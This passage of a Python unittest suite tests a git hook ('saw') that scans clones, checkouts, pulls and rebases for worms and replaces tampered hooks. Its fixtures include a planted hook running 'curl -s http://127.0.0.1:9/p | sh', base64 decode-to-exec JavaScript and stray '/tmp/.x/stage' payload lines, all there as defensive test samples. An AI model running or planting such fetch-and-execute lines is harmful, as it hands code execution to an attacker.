        self.assertIn("GIT_TEMPLATE_DIR", out)
        self.assertNotIn("✓ scan-on-clone installed", out)

    def test_a_global_hooks_folder_leaves_the_settling_unsettled_with_the_reason(self):
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(self.home / "hp")],
                            context=hook.gitutil.OPERATOR_CONFIG)
        done = hook.settle_hooks()
        self.assertFalse(done.settled)
        self.assertIn(str(self.home / "hp"), done.may_not_run)

    def test_saws_own_setting_for_its_git_calls_is_not_mistaken_for_one(self):
        self.assertEqual(hook._hookspath_git_uses(), (True, None))
        code, out = self._install()
        self.assertEqual(code, 0)
        self.assertIn("✓ scan-on-clone installed", out)


class TestNeverClobber(_Isolated):
    def test_existing_templatedir_foreign_hook_is_preserved_and_chained(self):
        # The operator already runs their OWN template dir with a post-checkout — we must coexist.
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        foreign = user_tpl / "hooks" / "post-checkout"
        foreign.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(foreign, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)

        self.assertEqual(hook.install(), 0)
        # Their hook is preserved as .local and OUR hook chains to it (never clobbered).
        preserved = user_tpl / "hooks" / "post-checkout.local"
        self.assertTrue(preserved.exists())
        self.assertIn("echo theirs", preserved.read_text())
        ours = (user_tpl / "hooks" / "post-checkout").read_text()
        self.assertIn(hook._MARKER, ours)
        self.assertIn("post-checkout.local", ours)
        # We did NOT hijack their templateDir setting.
        self.assertEqual(
            hook.gitutil.stdout(None, ["config", "--global", "--get", "init.templateDir"], context=hook.gitutil.OPERATOR_CONFIG).strip(),
            str(user_tpl))

    def test_uninstall_restores_the_foreign_hook(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        foreign = user_tpl / "hooks" / "post-checkout"
        foreign.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(foreign, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        hook.install()
        hook.uninstall()
        restored = user_tpl / "hooks" / "post-checkout"
        self.assertTrue(restored.exists())
        self.assertIn("echo theirs", restored.read_text())
        self.assertNotIn(hook._MARKER, restored.read_text())


class TestRunEventScope(_Isolated):
    def test_clone_full_scan_flags_infected(self):
        repo = _repo({".gitignore": _INFECTED})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 1)

    def test_clone_clean_returns_zero(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 0)

    def test_branch_switch_diff_scans_newly_materialised_code(self):
        # Switching to a branch that carries a worm materialises never-scanned code → it MUST be
        # caught (the old "skip every branch switch" behaviour was an evasion gap).
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        old = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        _run(repo, "checkout", "-qb", "evil")
        (repo / ".gitignore").write_text(_INFECTED)
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "evil")
        new = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        self.assertEqual(hook.run_event("post-checkout", [old, new, "1"]), 1)

    def test_branch_switch_with_no_changes_is_skipped(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        with mock.patch.object(hook, "scan_target") as m:
            self.assertEqual(hook.run_event("post-checkout", [head, head, "1"]), 0)
            m.assert_not_called()                        # nothing changed head..head → no scan

    def test_scan_timeout_reports_unverified_not_clean(self):
        # A giant clone must never hang git: the scan runs under a budget; on timeout the hook says
        # UNVERIFIED (exit 2), never "clean".
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        with mock.patch.object(hook, "_operator_scan", side_effect=lambda *a, **k: time.sleep(3)), \
             mock.patch.dict(os.environ, {"SAW_HOOK_TIMEOUT": "0.2"}):
            self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 2)

    def test_a_file_checkout_whose_git_saw_cannot_find_reads_the_tree(self):
        repo = _repo({".gitignore": _INFECTED})
        self._in_repo(repo)
        with mock.patch.object(hook.checkout_writes, "git_started_ns", return_value=None):
            self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, "x", "0"]), 1)

    def test_pull_diff_scans_only_changed_files(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        first = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        (repo / ".gitignore").write_text(_INFECTED)
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "pulled")
        _run(repo, "update-ref", "ORIG_HEAD", first)             # simulate what a pull sets
        captured = {}
        real = hook.scan_target

        def spy(target, *a, **k):
            captured["files"] = list(target.iter_files())
            return real(target, *a, **k)

        with mock.patch.object(hook, "scan_target", side_effect=spy):
            rc = hook.run_event("post-merge", ["0"])
        self.assertEqual(rc, 1)                                  # the pulled worm is caught
        self.assertEqual(captured["files"], [".gitignore"])      # ONLY the changed file was scanned

    def test_post_rewrite_diff_scans_rebased_code(self):
        # `git pull --rebase` (and rebase) fire post-rewrite; ORIG_HEAD..HEAD is the replayed code.
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        first = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        (repo / ".gitignore").write_text(_INFECTED)
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "rebased-in worm")
        _run(repo, "update-ref", "ORIG_HEAD", first)     # what a rebase/pull --rebase sets
        self.assertEqual(hook.run_event("post-rewrite", ["rebase"]), 1)

    def test_post_rewrite_without_orig_head_is_skipped(self):
        repo = _repo({".gitignore": _INFECTED})          # fresh repo → no ORIG_HEAD
        self._in_repo(repo)
        with mock.patch.object(hook, "scan_target") as m:
            self.assertEqual(hook.run_event("post-rewrite", ["amend"]), 0)
            m.assert_not_called()

    def test_infected_warning_is_branded_and_actionable(self):
        repo = _repo({".gitignore": _INFECTED})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            rc = hook.run_event("post-checkout", [hook._NULL_REV, head, "1"])
        out = buf.getvalue()
        self.assertEqual(rc, 1)
        self.assertIn("StayAwakeBot", out)                   # correct product branding…
        self.assertNotIn("stayawake:", out)                  # …not the old lowercase prefix
        # spells out what to AVOID, not just "before running it"
        self.assertIn("npm install", out)
        self.assertIn("editor", out)
        # the remediation commands are present (rendered distinctly via LINK)
        self.assertIn("saw scan ", out)
        self.assertIn("saw fix ", out)

    def test_suspicious_warning_spells_out_what_to_avoid(self):
        # a base64 decode→exec repo is heuristic/suspicious, not confirmed-infected
        repo = _repo({"index.js": "const r = require('child_process').execSync("
                                  "Buffer.from('ZWNobyBoaQ==','base64').toString());\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            rc = hook.run_event("post-checkout", [hook._NULL_REV, head, "1"])
        out = buf.getvalue()
        self.assertEqual(rc, 0)                              # suspicious does not fail
        self.assertIn("StayAwakeBot", out)
        self.assertIn("npm install", out)                    # avoid-list, not just "before running it"
        self.assertIn("saw scan ", out)

    def test_no_stream_turns_the_spinner_off(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        scanned = mock.Mock(error=None, infected=False, suspicious=False)
        with mock.patch.object(hook, "stream_enabled", return_value=False) as enabled, \
             mock.patch.object(hook, "_scan_within_budget", return_value=scanned):
            hook.run_event("post-checkout", [hook._NULL_REV, head, "1"], no_stream=True)
        self.assertTrue(enabled.call_args.kwargs.get("force_off"))

    def test_kill_switch_skips_everything(self):
        repo = _repo({".gitignore": _INFECTED})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        with mock.patch.dict(os.environ, {"SAW_HOOK_DISABLED": "1"}), \
             mock.patch.object(hook, "scan_target") as m:
            self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 0)
            m.assert_not_called()

    def test_sha_cache_skips_second_full_scan(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 0)
        with mock.patch.object(hook, "scan_target") as m:       # same tree → cache hit, no rescan
            self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 0)
            m.assert_not_called()

    def test_a_template_dir_spelled_with_a_tilde_is_written_where_git_reads_it(self):
        subprocess.run(["git", "config", "--global", "init.templateDir", "~/.git-template"], check=True)
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(hook.install(), 0)
        self.assertTrue((self.home / ".git-template" / "hooks" / "post-checkout").is_file())
        self.assertFalse((Path.cwd() / "~").exists())

    def test_the_cache_forgets_a_repository_that_is_gone(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        gone = self.home / "gone"
        hook._cache_path().parent.mkdir(parents=True, exist_ok=True)
        hook._cache_path().write_text(json.dumps({str(gone): "0ld", os.path.realpath(repo): "stale"}))
        hook._remember(repo, "fresh")
        self.assertEqual(hook._load_cache(), {os.path.realpath(repo): "fresh"})


class _Clones(_Isolated):
    _started = None

    def _kept(self, path: Path) -> Path:
        self.addCleanup(lambda: __import__("shutil").rmtree(path, ignore_errors=True))
        return path

    def _source(self, files: dict[str, str]) -> Path:
        return self._kept(_repo(files))

    def _clone(self, source: Path, *flags: str) -> Path:
        dest = self._kept(Path(tempfile.mkdtemp(prefix="hook-clone-"))) / "c"
        subprocess.run(["git", "-c", "protocol.file.allow=always", "clone", "-q", *flags, str(source),
                        str(dest)], check=True, capture_output=True)
        return dest

    def _head(self, repo: Path) -> str:
        return hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()

    def _checkout_event(self, repo: Path, old: str) -> int:
        self._in_repo(repo)
        with contextlib.redirect_stderr(io.StringIO()):
            return hook.run_event("post-checkout", [old, self._head(repo), "1"])

    def _file_checkout(self, repo: Path, *args: str) -> None:
        time.sleep(0.05)
        fd, probe = tempfile.mkstemp(dir=repo.parent)
        os.close(fd)
        self._started = os.stat(probe).st_ctime_ns
        os.unlink(probe)
        _run(repo, *args)

    def _file_checkout_event(self, repo: Path) -> int:
        self._in_repo(repo)
        with mock.patch.object(hook.checkout_writes, "git_started_ns", return_value=self._started), \
                mock.patch.object(hook.checkout_writes, "_CLOCK_SLACK_NS", 0), \
                contextlib.redirect_stderr(io.StringIO()):
            return hook.run_event("post-checkout", [self._head(repo), self._head(repo), "0"])

    def _scanned_by_file_checkout(self, repo: Path):
        with mock.patch.object(hook, "_operator_scan", wraps=hook._operator_scan) as scan:
            code = self._file_checkout_event(repo)
        return code, scan.call_args.args[1] if scan.called else "not scanned"

    def _with_a_branch(self, files: dict[str, str], branch: dict[str, str]) -> Path:
        source = self._source(files)
        _run(source, "checkout", "-qb", "pr")
        for rel, text in branch.items():
            (source / rel).parent.mkdir(parents=True, exist_ok=True)
            (source / rel).write_text(text)
        _run(source, "add", "-A")
        _run(source, "commit", "-qm", "pr")
        _run(source, "checkout", "-q", "-")
        return source

    def _cloned_and_read(self, source: Path) -> Path:
        clone = self._clone(source)
        self.assertEqual(self._checkout_event(clone, hook._NULL_REV), 0)
        return clone


class TestTheFirstCheckoutAfterAClone(_Clones):
    """The checkout that first writes a cloned repository's files scans every file it wrote."""

    def test_a_submodule_cloned_with_its_superproject_is_scanned(self):
        sub = self._source({".gitignore": _INFECTED})
        superproject = self._source({"f": "s\n"})
        _run(superproject, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(sub), "sub")
        _run(superproject, "commit", "-qm", "sub")
        inner = self._clone(superproject, "--recurse-submodules") / "sub"
        self.assertEqual(self._checkout_event(inner, self._head(inner)), 1)

    def test_a_checkout_after_a_clone_that_wrote_no_files_is_scanned(self):
        clone = self._clone(self._source({".gitignore": _INFECTED}), "--no-checkout")
        branch = hook.gitutil.stdout(clone, ["rev-parse", "--abbrev-ref", "HEAD"]).strip()
        _run(clone, "checkout", "-q", branch)
        self.assertEqual(self._checkout_event(clone, self._head(clone)), 1)

    def test_a_file_the_first_checkout_writes_unchanged_is_scanned(self):
        source = self._source({".gitignore": _INFECTED, "README": "a\n"})
        default = self._head(source)
        _run(source, "checkout", "-qb", "next")
        (source / "README").write_text("b\n")
        _run(source, "commit", "-qam", "next")
        _run(source, "checkout", "-q", "-")
        clone = self._clone(source, "--no-checkout")
        _run(clone, "checkout", "-q", "origin/next")
        self.assertEqual(self._checkout_event(clone, default), 1)

    def test_a_checkout_that_moves_nothing_after_a_clone_that_wrote_no_files_is_scanned(self):
        clone = self._clone(self._source({".gitignore": _INFECTED}), "--no-checkout")
        _run(clone, "checkout", "-q")
        self.assertEqual(self._checkout_event(clone, self._head(clone)), 1)

    def test_a_clone_scanned_clean_scans_only_what_its_first_switch_changed(self):
        source = self._source({"a.txt": "a\n"})
        _run(source, "checkout", "-qb", "dev")
        (source / "b.txt").write_text("b\n")
        _run(source, "add", "b.txt")
        _run(source, "commit", "-qm", "b")
        _run(source, "checkout", "-q", "-")
        clone = self._clone(source)
        cloned = self._head(clone)
        self.assertEqual(self._checkout_event(clone, hook._NULL_REV), 0)
        _run(clone, "checkout", "-q", "dev")
        self.assertEqual(hook._scan_scope("post-checkout", [cloned, self._head(clone), "1"], clone),
                         (("b.txt",), "checkout"))

    def test_a_second_new_branch_at_the_same_commit_scans_nothing(self):
        clone = self._clone(self._source({".gitignore": _INFECTED}))
        _run(clone, "checkout", "-qb", "one")
        _run(clone, "checkout", "-qb", "two")
        head = self._head(clone)
        self.assertEqual(hook._scan_scope("post-checkout", [head, head, "1"], clone), (False, None))

    def test_a_commit_only_partly_on_disk_is_not_remembered_as_scanned_clean(self):
        clone = self._clone(self._source({"a.js": "a\n", ".gitignore": _INFECTED}), "--no-checkout")
        _run(clone, "checkout", "HEAD", "--", "a.js")
        _run(clone, "checkout", "-qb", "x")
        self._in_repo(clone)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertEqual(hook.run_event("post-checkout", [self._head(clone), self._head(clone), "1"]), 0)
        self.assertNotIn("scanned clean", err.getvalue())
        self.assertFalse(hook._scanned_clean(clone, hook._clean_key(self._head(clone), None)))
        self._file_checkout(clone, "checkout", "HEAD", "--", ".")
        self.assertEqual(self._file_checkout_event(clone), 1)

    def test_a_clone_on_disk_in_full_is_remembered_as_scanned_clean(self):
        clone = self._cloned_and_read(self._source({"a.js": "a\n"}))
        self.assertTrue(hook._scanned_clean(clone, hook._clean_key(self._head(clone), None)))


class TestAFileCheckoutScansWhatItWrote(_Clones):
    """A file checkout scans every file the git command that ran it wrote."""

    def test_a_clone_without_a_checkout_then_a_file_checkout_of_everything_is_scanned(self):
        clone = self._clone(self._source({"a.js": "a\n", ".gitignore": _INFECTED}), "--no-checkout")
        self._file_checkout(clone, "checkout", "HEAD", "--", ".")
        self.assertEqual(self._file_checkout_event(clone), 1)

    def test_a_file_from_another_revision_is_scanned(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {".gitignore": _INFECTED}))
        self._file_checkout(clone, "checkout", "origin/pr", "--", ".gitignore")
        self.assertEqual(self._file_checkout_event(clone), 1)

    def test_a_file_restored_from_another_revision_that_git_does_not_track_is_scanned(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {".gitignore": _INFECTED}))
        self._file_checkout(clone, "restore", "--source=origin/pr", ".gitignore")
        self.assertEqual(self._file_checkout_event(clone), 1)

    def test_files_written_after_the_commit_moved_without_a_hook_are_scanned(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {".gitignore": _INFECTED}))
        _run(clone, "reset", "-q", "origin/pr")
        self._file_checkout(clone, "checkout", "--", ".")
        self.assertEqual(self._file_checkout_event(clone), 1)

    def test_a_tracked_file_in_a_folder_a_whole_read_skips_is_scanned_when_written(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {"dist/.gitignore": _INFECTED}))
        self._file_checkout(clone, "checkout", "origin/pr", "--", "dist")
        self.assertEqual(self._file_checkout_event(clone), 1)

    def test_a_link_to_a_file_it_wrote_is_scanned(self):
        source = self._source({"plain.txt": "plain\n"})
        os.symlink("plain.txt", source / ".gitignore")
        _run(source, "add", "-A")
        _run(source, "commit", "-qm", "link")
        _run(source, "checkout", "-qb", "pr")
        (source / "plain.txt").write_text(_INFECTED)
        _run(source, "commit", "-qam", "pr")
        _run(source, "checkout", "-q", "-")
        clone = self._cloned_and_read(source)
        self._file_checkout(clone, "checkout", "origin/pr", "--", "plain.txt")
        self.assertEqual(self._scanned_by_file_checkout(clone), (1, (".gitignore", "plain.txt")))

    def test_a_written_link_into_the_hooks_folder_is_reported(self):
        source = self._source({"a.js": "a\n"})
        _run(source, "checkout", "-qb", "pr")
        os.symlink(".git/hooks", source / "hk")
        _run(source, "add", "hk")
        _run(source, "commit", "-qm", "pr")
        _run(source, "checkout", "-q", "-")
        clone = self._cloned_and_read(source)
        self._file_checkout(clone, "checkout", "origin/pr", "--", "hk")
        self.assertEqual(self._file_checkout_event(clone), 1)

    def test_a_file_rewritten_with_a_finding_is_reported_again(self):
        clone = self._clone(self._source({"a.js": "a\n", ".gitignore": _INFECTED}))
        self.assertEqual(self._checkout_event(clone, hook._NULL_REV), 1)
        (clone / ".gitignore").unlink()
        self._file_checkout(clone, "checkout", "--", ".gitignore")
        self.assertEqual(self._file_checkout_event(clone), 1)

    def test_only_what_the_command_wrote_is_scanned(self):
        clone = self._clone(self._source({"a.js": "a\n", "b.js": "b\n", ".gitignore": _INFECTED}))
        self.assertEqual(self._checkout_event(clone, hook._NULL_REV), 1)
        (clone / "a.js").write_text("edit\n")
        (clone / "b.js").write_text("edit\n")
        self._file_checkout(clone, "checkout", "--", "a.js")
        self.assertEqual(self._scanned_by_file_checkout(clone), (0, ("a.js",)))

    def test_a_file_checkout_that_writes_nothing_scans_nothing(self):
        clone = self._cloned_and_read(self._source({"a.js": "a\n"}))
        self._file_checkout(clone, "checkout", "--", "a.js")
        self.assertEqual(self._scanned_by_file_checkout(clone), (0, "not scanned"))

    def test_a_file_scanned_by_one_file_checkout_is_not_scanned_by_the_next(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {"b.js": "b\n"}))
        self._file_checkout(clone, "checkout", "origin/pr", "--", "b.js")
        self.assertEqual(self._scanned_by_file_checkout(clone), (0, ("b.js",)))
        (clone / "a.js").write_text("edit\n")
        self._file_checkout(clone, "checkout", "--", "a.js")
        self.assertEqual(self._scanned_by_file_checkout(clone), (0, ("a.js",)))

    def _restored_after_an_edit(self, clone: Path, text: str) -> None:
        (clone / "a.js").write_text(text)
        self._file_checkout(clone, "checkout", "--", "a.js")

    def test_restoring_content_already_scanned_clean_scans_nothing(self):
        clone = self._cloned_and_read(self._source({"a.js": "a\n"}))
        self._restored_after_an_edit(clone, "edit\n")
        self.assertEqual(self._scanned_by_file_checkout(clone), (0, ("a.js",)))
        self._restored_after_an_edit(clone, "edit again\n")
        self.assertEqual(self._scanned_by_file_checkout(clone), (0, "not scanned"))

    def test_content_scanned_clean_under_another_policy_is_scanned_again(self):
        clone = self._cloned_and_read(self._source({"a.js": "a\n"}))
        self._restored_after_an_edit(clone, "edit\n")
        self.assertEqual(self._scanned_by_file_checkout(clone), (0, ("a.js",)))
        self._restored_after_an_edit(clone, "edit again\n")
        with mock.patch.object(hook, "_policy_digest", return_value="another"):
            self.assertEqual(self._scanned_by_file_checkout(clone), (0, ("a.js",)))

    def test_a_scan_with_a_finding_remembers_nothing(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {".gitignore": _INFECTED, "b.js": "b\n"}))
        self._file_checkout(clone, "checkout", "origin/pr", "--", ".gitignore", "b.js")
        self.assertEqual(self._file_checkout_event(clone), 1)
        (clone / "b.js").write_text("edit\n")
        (clone / ".gitignore").unlink()
        self._file_checkout(clone, "checkout", "--", "b.js", ".gitignore")
        self.assertEqual(self._scanned_by_file_checkout(clone), (1, (".gitignore", "b.js")))

    def test_a_file_changed_while_it_was_scanned_is_not_remembered(self):
        clone = self._cloned_and_read(self._source({"a.js": "a\n"}))
        self._restored_after_an_edit(clone, "edit\n")
        real = hook._operator_scan

        def changed_during_the_scan(*args, **kwargs):
            os.utime(clone / "a.js", ns=(1, 1))
            return real(*args, **kwargs)

        with mock.patch.object(hook, "_operator_scan", side_effect=changed_during_the_scan):
            self.assertEqual(self._file_checkout_event(clone), 0)
        self._restored_after_an_edit(clone, "edit again\n")
        self.assertEqual(self._scanned_by_file_checkout(clone), (0, ("a.js",)))

    def test_a_store_that_cannot_be_written_leaves_the_verdict_as_it_is(self):
        clone = self._cloned_and_read(self._source({"a.js": "a\n"}))
        self._restored_after_an_edit(clone, "edit\n")
        with mock.patch.object(hook.clean_contents, "remember", side_effect=OSError):
            self.assertEqual(self._file_checkout_event(clone), 0)

    def test_a_file_checkout_does_not_read_the_history(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {"b.js": "b\n"}))
        self._file_checkout(clone, "checkout", "origin/pr", "--", "b.js")
        with mock.patch.object(hook, "_operator_scan", wraps=hook._operator_scan) as scan:
            self.assertEqual(self._file_checkout_event(clone), 0)
        self.assertEqual(scan.call_args.args[1], ("b.js",))
        self.assertEqual(scan.call_args.args[4], [])

    def test_when_saw_cannot_tell_when_git_started_the_tree_is_read_whole(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {".gitignore": _INFECTED}))
        _run(clone, "checkout", "origin/pr", "--", ".gitignore")
        self.assertEqual(self._scanned_by_file_checkout(clone), (1, None))

    def test_a_tree_it_cannot_look_at_is_read_whole(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {".gitignore": _INFECTED}))
        self._file_checkout(clone, "checkout", "origin/pr", "--", ".gitignore")
        with mock.patch.object(hook.checkout_writes, "written", return_value=None):
            self.assertEqual(self._scanned_by_file_checkout(clone), (1, None))

    def test_a_scan_that_could_not_finish_reads_as_not_verified(self):
        clone = self._cloned_and_read(self._with_a_branch({"a.js": "a\n"}, {"b.js": "b\n"}))
        self._file_checkout(clone, "checkout", "origin/pr", "--", "b.js")
        unfinished = ScanResult(target="t", source="local", error="a file could not be read")
        with mock.patch.object(hook, "_operator_scan", return_value=unfinished):
            self.assertEqual(self._file_checkout_event(clone), 2)


class TestTheCleanMemoryFollowsThePolicy(_Isolated):
    def test_it_changes_with_the_folders_a_walk_skips(self):
        config = self.home / "saw.yml"
        config.write_text("settings:\n  exclude_dirs: ['.git']\n")
        self.assertNotEqual(hook._clean_key("c0ffee", None), hook._clean_key("c0ffee", str(config)))

    def test_it_changes_with_the_advisory_database(self):
        before = hook._clean_key("c0ffee", None)
        cache = self.home / ".cache" / "saw" / "advisories"
        listed = osv_zip({"MAL.json": mal_record("late-evil", ["1.0.0"])})
        db.write_manifest(cache, [db.update_ecosystem("npm", cache, fetch=lambda bucket: listed)])
        self.addCleanup(db._CORPUS_MEMO.clear)
        self.assertNotEqual(before, hook._clean_key("c0ffee", None))


def _set_aside(home: Path) -> list[Path]:
    root = home / ".local" / "state" / "saw" / "set-aside" / "hooks"
    return sorted(root.iterdir()) if root.is_dir() else []


def _reporting(fn, *args) -> tuple[int, str, list]:
    """Run a hook command with its output captured. Takes the command and its arguments. Returns its
    status, what it printed, and every action it reported."""
    done: list = []
    real = hook._print_actions

    def record(actions, stream, **kwargs):
        done.extend(actions)
        return real(actions, stream, **kwargs)

    out = io.StringIO()
    with mock.patch.object(hook, "_print_actions", side_effect=record), contextlib.redirect_stdout(out):
        code = fn(*args)
    return code, out.getvalue(), done


def _states(done: list) -> list[tuple[str, Path]]:
    return [(a.state, a.path) for a in done]


class TestSawsDirectoryIsSawsAlone(_Isolated):
    def _managed(self) -> Path:
        return self.home / ".config" / "saw" / "git-template" / "hooks"

    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def test_a_stranger_in_saws_directory_is_moved_aside_never_chained(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        planted = managed / "post-checkout"
        planted.write_text("#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n")
        os.chmod(planted, 0o755)
        (managed / "post-merge.local").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        (managed / "notes.txt").write_text("hello\n")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse((managed / "post-checkout.local").exists())
        self.assertFalse((managed / "post-merge.local").exists())
        self.assertFalse((managed / "notes.txt").exists())
        self.assertEqual(sorted(p.name for p in managed.iterdir()), sorted(hook._HOOKS))
        for event in hook._HOOKS:
            self.assertEqual(hook.hookscript.verdict(managed / event), hook.hookscript.PRISTINE)
        kept = _set_aside(self.home)
        self.assertEqual(len(kept), 3, kept)
        by_name = {f.name.split("-", 1)[1]: f for f in kept}
        self.assertIn("curl -s http://127.0.0.1:9/p | sh", (by_name["post-checkout"] / "kept" / "post-checkout").read_text())
        record = json.loads((by_name["post-checkout"] / "origin.json").read_text())
        self.assertEqual(record["path"], str(planted))
        self.assertTrue(record["sha256"].startswith(hook.hookscript.digest_file(by_name["post-checkout"] / "kept" / "post-checkout")[:64]))
        self.assertIn("moved aside", text)
        self.assertNotIn(str(planted), text)

    def test_an_altered_saw_hook_is_repaired_and_its_content_kept(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        managed = self._managed()
        altered = (managed / "post-merge").read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n")
        (managed / "post-merge").write_text(altered)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(hook.hookscript.verdict(managed / "post-merge"), hook.hookscript.PRISTINE)
        (kept,) = _set_aside(self.home)
        self.assertEqual((kept / "kept" / "post-merge").read_text(), altered)
        self.assertIn("had been changed", text)

    def test_the_operators_own_template_directory_keeps_their_hook_but_not_an_altered_one_of_saws(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        theirs = user_tpl / "hooks" / "post-checkout"
        theirs.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(theirs, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)], context=hook.gitutil.OPERATOR_CONFIG)
        self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertIn("echo theirs", (user_tpl / "hooks" / "post-checkout.local").read_text())
        self.assertEqual(_set_aside(self.home), [])
        ours = user_tpl / "hooks" / "post-merge"
        ours.write_text(ours.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(hook.hookscript.verdict(ours), hook.hookscript.PRISTINE)
        self.assertEqual(len(_set_aside(self.home)), 1)
        self.assertIn("echo theirs", (user_tpl / "hooks" / "post-checkout.local").read_text())

    def test_pointing_the_hooks_path_at_saws_directory_does_not_make_a_stranger_there_yours(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        planted = managed / "post-checkout.local"
        planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
        os.chmod(planted, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(managed)], context=hook.gitutil.OPERATOR_CONFIG)
        self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertFalse(planted.exists())
        self.assertEqual(len(_set_aside(self.home)), 1)
        self.assertEqual(hook.hookscript.altered_hooks(), [])
        planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
        self.assertEqual(hook.hookscript.altered_hooks(), [planted])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertFalse(planted.exists())

    def test_a_hook_that_cannot_be_read_back_as_written_is_not_counted(self):
        real_rename = os.rename

        def tampered(src, dst, *, src_dir_fd=None, dst_dir_fd=None):
            real_rename(src, dst, src_dir_fd=src_dir_fd, dst_dir_fd=dst_dir_fd)
            if dst_dir_fd is not None and not dst.endswith(".json"):
                fd = os.open(dst, os.O_WRONLY | os.O_APPEND, dir_fd=dst_dir_fd)
                os.write(fd, b"#\n")
                os.close(fd)

        with mock.patch("os.rename", side_effect=tampered):
            code, text = self._quiet(hook.install)
        self.assertEqual(code, 3, text)
        self.assertIn("could be put in place", text)
        self.assertIn("NOT fully installed", text)
        self.assertEqual(hook.hookscript.installed(), (hook._saw_executable(), None))

    def test_uninstall_moves_aside_what_is_not_saws_in_saws_directory(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        managed = self._managed()
        (managed / "post-checkout.local").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        altered = managed / "post-merge"
        altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        code, text = self._quiet(hook.uninstall)
